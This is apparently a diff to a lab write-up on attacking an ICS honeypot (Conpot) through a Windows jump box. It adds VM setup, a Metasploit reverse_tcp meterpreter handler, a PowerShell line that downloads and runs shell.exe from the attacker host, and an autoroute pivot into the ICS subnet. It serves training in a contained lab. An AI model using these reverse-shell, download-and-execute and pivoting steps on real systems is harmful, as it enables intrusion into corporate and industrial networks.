@@ -26,6 +26,35 @@ Kali (Attacker)
 
 ---
 
+## VM Configuration
+
+### Kali Linux (Attacker)
+ - VMnet Adapter: NAT or Host-only for CorpNet
+ - IP Address: 192.168.1.100
+ - Installed tools: metasploit, nmap, net-tools, python3
+
+### Windows 10 (Jump Box)
+ - VMnet Adapters
+    - Adapter 1: CorpNet -> 192.168.1.150
+    - Adapter 2: ICSNet -> 10.0.0.150
+ - Firewall: Disabled or ICMP/port exceptions configured
+ - Browser: Edge used to download shell payload
+
+### Ubuntu (Conpot Honeypot)
+ - VMnet Adapter: ICSNet
+ - IP Address: 10.0.0.200
+ - Setup
+   - Python virtual environment created for Conpot
+   - Conpot installed and run using the default Modbus template
+   - 
+sudo apt update && sudo apt install python3-pip python3-venv -y
+python3 -m venv conpot-env
+source conpot-env/bin/activate
+pip install conpot
+conpot --template default -f
+
+- confirm that conpot is listening on port 5020
+
 ## Reconnaissance
 
 ### Target Identified via `ps aux`
@@ -51,12 +80,32 @@ Located at:
 ## Pivot: Route Through Meterpreter
 
 ```bash
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+run
+```
+
+> establishes a reverse shell from Kali after delivering a payload to the windows jump box
+
+```bash
+Invoke-WebRequest -Uri http://192.168.1.100:8000/shell.exe -OutFile shell.exe
+Start-Process shell.exe
+```
+
+> Run this command on the windows machine to pass the payload and download shell.exe
+
+## Once the session is active:
+
+```bash
 meterpreter > run autoroute -s 10.0.0.0/24
 ```
 
-> Adds a route from the jump box to the ICS subnet via `192.168.1.150`
+> This adds a route from the jump box to the ICS subnet
 
----
+
 
 ## Exploitation with `modbusclient`
 
